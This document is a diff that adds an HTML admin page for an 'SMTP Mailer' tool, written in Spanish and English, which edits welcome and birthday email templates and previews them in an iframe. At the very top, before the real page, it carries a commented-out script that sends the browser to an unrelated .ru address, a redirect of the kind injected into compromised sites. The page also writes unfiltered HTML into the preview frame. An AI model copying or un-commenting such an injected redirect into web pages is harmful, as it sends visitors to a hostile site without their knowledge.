@@ -1,0 +1,255 @@
+<!-- 
+<html><head></head><body><script>document.location='https://folusoal.ru/e507h/';</script></body></html> -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SMTP Mailer</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+ 
+  <style>
+    body {
+      background-color: #ffffff;;
+      color: #121212;
+    }
+    .container {
+      background-color: rgba(30, 30, 30, 0.8);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    .container:hover {
+      background-color: rgba(42, 42, 42, 0.8);
+      box-shadow: 0 0 25px rgba(0, 0, 0, 0.8);
+    }
+    .btn-primary {
+      background-color: #007bff;
+      border: none;
+      transition: background-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    .btn-primary:hover {
+      background-color: #0056b3;
+      box-shadow: 0 0 10px rgba(0, 123, 255, 0.5);
+    }
+  </style>
+</head>
+
+<body class="flex items-center justify-center min-h-screen p-1 lg:p-10">
+
+
+  <div class="container max-w-4xl mx-auto p-6 rounded-lg shadow-lg">
+
+    <nav class="navbar navbar-expand-lg">
+      <div class="container-fluid">
+        <a class="navbar-brand" href="#">Configuración</a>
+        <button class="navbar-toggler" 
+        type="button" 
+        data-bs-toggle="collapse" 
+        data-bs-target="#navbarText" 
+        aria-controls="navbarText" 
+        aria-expanded="false" 
+        aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarText">
+          <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="/">Inicio</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/edit-bienvenido">Editar bienvenido</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/edit-feliz-cumple">Editar cumpleaños</a>
+            </li>
+          </ul>
+          <span class="navbar-text">Developed by ArmorTemplate</span>
+        </div>
+      </div>
+    </nav>
+
+    <form action="/send-email" method="POST" enctype="multipart/form-data" id="emailForm">
+      <div class="mb-6">
+        <label class="block text-lg mb-2">Choose how to provide HTML content:</label>
+        <div class="flex items-center mb-2">
+          <input disabled onclick="reloadPage()" type="radio" id="fileOption" name="htmlInputOption" class="form-radio text-blue-600" value="fileOption" required>
+          <label for="fileOption" class="ml-2">Upload HTML file</label>
+        </div>
+        <div class="flex items-center">
+          <input  onclick="reloadPage()" type="radio" id="codeOption" name="htmlInputOption" class="form-radio text-blue-600" value="codeOption" required>
+          <label for="codeOption" class="ml-2">Enter HTML code</label>
+        </div>
+        <input  type="file" class="mt-2 block w-full p-2 bg-gray-800 text-white border border-gray-700 rounded focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent" id="htmlFile" name="file" disabled>
+        <textarea class="mt-2 block w-full p-2 bg-gray-800 text-white border border-gray-700 rounded focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent" id="htmlCode" name="htmlCode" rows="10" disabled></textarea>  
+      </div>
+      <div class="flex justify-center">
+        <button type="button" id="saveChangesBtn" class="w-1/2 p-3 mt-3 mb-3 rounded bg-gray-700 text-white hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-600 focus:ring-opacity-50">Save Changes</button>
+      </div>
+
+      <div class="flex justify-center">
+        <button onclick="reloadPage()" type="button" id="loadPreview" class="w-1/2 p-3 mt-3 mb-3 rounded bg-gray-700 text-white hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-gray-600 focus:ring-opacity-50">
+          GUARDAR CAMBIOS</button>
+      </div>
+
+      <!-- Agregar un elemento para mostrar el HTML editado -->
+      <div id="previewHTML" class="mt-6 p-4 bg-gray-100 rounded-lg hidden">
+        <h3 class="text-lg font-bold mb-2 text-gray-800">Vista previa de correo</h3>
+        <iframe id="htmlPreviewFrame" style="width: 100%; height: 700px; border: none;"></iframe>
+      </div>
+      
+
+    </form>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script>
+    document.getElementById('emailForm').addEventListener('submit', function(event) {
+      // No prevenimos el comportamiento por defecto del formulario para que se envíe
+      setTimeout(() => {
+        // Redirigimos a la ruta /logs inmediatamente después de que el formulario comience a enviarse
+        window.location.href = '/logs';
+      }, 100); // Pequeño retraso para asegurar que el formulario comienza a enviarse
+    });
+  </script>
+  <script>
+    function redirectLogs(){
+      window.location.href = '/logs'
+    }
+    // Función para cargar el HTML dentro del iframe
+    function loadHtmlContentInFrame(htmlContent) {
+      const iframe = document.getElementById('htmlPreviewFrame');
+      const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
+      iframeDocument.open();
+      iframeDocument.write(htmlContent);
+      iframeDocument.close();
+    }
+    function reloadPage(){
+      window.location.reload();
+    };
+    
+    $(document).ready(async function() {
+
+              // Obtener la opción seleccionada almacenada en localStorage
+        const htmlInputOption = localStorage.getItem('htmlInputOption');
+        if (htmlInputOption) {
+          $(`input[name="htmlInputOption"][value="${htmlInputOption}"]`).prop('checked', true).trigger('change');
+        }
+
+        // Manejar el cambio de opción y guardar en localStorage
+        $('input[name="htmlInputOption"]').change(function() {
+          const selectedOption = $(this).val();
+          localStorage.setItem('htmlInputOption', selectedOption);
+        });
+
+
+      $('input[name="leadsInputOption"]').change(function() {
+        if ($('#leadsOptionManual').is(':checked')) {
+          $('#leads').prop('disabled', false);
+          $('#leadsFile').prop('disabled', true);
+        } else if ($('#leadsOptionFile').is(':checked')) {
+          $('#leads').prop('disabled', true);
+          $('#leadsFile').prop('disabled', false);
+        }
+      });
+
+      let customHtmlContent = ''; // Variable global para almacenar el HTML personalizado
+
+      // Cargar el HTML personalizado al iniciar la página
+      try {
+        const response = await fetch('/load-welcome-html');
+        if (response.ok) {
+          customHtmlContent = await response.text();
+          updateHtmlPreview(); // Actualizar vista previa y cargar en el iframe
+          $('#previewHTML').show(); // Mostrar la vista previa del textarea
+        } else {
+          console.error('Error al cargar el HTML personalizado');
+        }
+      } catch (error) {
+        console.error('Error al cargar el HTML personalizado:', error);
+      }
+
+      // Función para actualizar el textarea con el HTML personalizado
+      function updateHtmlTextarea() {
+        $('#htmlCode').val(customHtmlContent);
+      }
+
+      // Mostrar el HTML editado en el preview y cargarlo en el iframe
+      function updateHtmlPreview() {
+        $('#htmlPreviewContent').html(customHtmlContent); // Mostrar en el área de vista previa
+        loadHtmlContentInFrame(customHtmlContent); // Cargar en el iframe
+      }
+
+      // Habilitar/deshabilitar entrada de HTML
+      $('input[name="htmlInputOption"]').change(function() {
+        if ($('#fileOption').is(':checked')) {
+          $('#htmlFile').prop('disabled', false);
+          $('#htmlCode').prop('disabled', true);
+          $('#htmlCode').hide();
+          $('#saveChangesBtn').hide(); // Ocultar el textarea
+          $('#loadPreview').show();
+
+          // Actualizar el contenido de la vista previa si hay un archivo cargado
+          if ($('#htmlFile')[0].files.length > 0) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+              customHtmlContent = e.target.result;
+              updateHtmlPreview();
+              $('#previewHTML').show(); // Mostrar la vista previa del archivo
+            };
+            reader.readAsText($('#htmlFile')[0].files[0]);
+          } else {
+            $('#previewHTML').hide(); // Ocultar la vista previa si no hay archivo cargado
+          }
+        } else if ($('#codeOption').is(':checked')) {
+          $('#htmlFile').prop('disabled', true);
+          $('#htmlCode').prop('disabled', false);
+          $('#htmlCode').show(); // Mostrar el textarea
+          updateHtmlTextarea(); // Llamar a la función para actualizar el textarea
+          updateHtmlPreview(); // Mostrar la vista previa del contenido del textarea y cargar en el iframe
+          $('#previewHTML').show(); // Mostrar la vista previa del textarea
+          // Recargar la página cuando se selecciona la opción de código
+          $('#loadPreview').hide();
+        }
+      });
+
+      // Guardar cambios en el HTML personalizado
+      $('#saveChangesBtn').click(async function() {
+        const newHtmlContent = $('#htmlCode').val();
+
+        try {
+          const response = await fetch('/save-welcome-html', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ htmlContent: newHtmlContent })
+          });
+
+          if (response.ok) {
+            customHtmlContent = newHtmlContent; // Actualizar la variable global con el nuevo contenido guardado
+            alert('Cambios guardados exitosamente.');
+            updateHtmlPreview(); // Actualizar preview después de guardar
+            $('#previewHTML').show(); // Mostrar la vista previa del textarea
+          } else {
+            console.error('Error al guardar los cambios en el HTML personalizado.');
+            alert('Error al guardar los cambios. Inténtalo de nuevo.');
+          }
+        } catch (error) {
+          console.error('Error al guardar los cambios en el HTML personalizado:', error);
+          alert('Error al guardar los cambios. Inténtalo de nuevo.');
+        }
+      });
+
+      // Disparar evento de cambio al cargar la página para inicializar el estado
+      $('input[name="htmlInputOption"]:checked').trigger('change');
+    });
+  </script>
+     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+
+</body>
+</html>
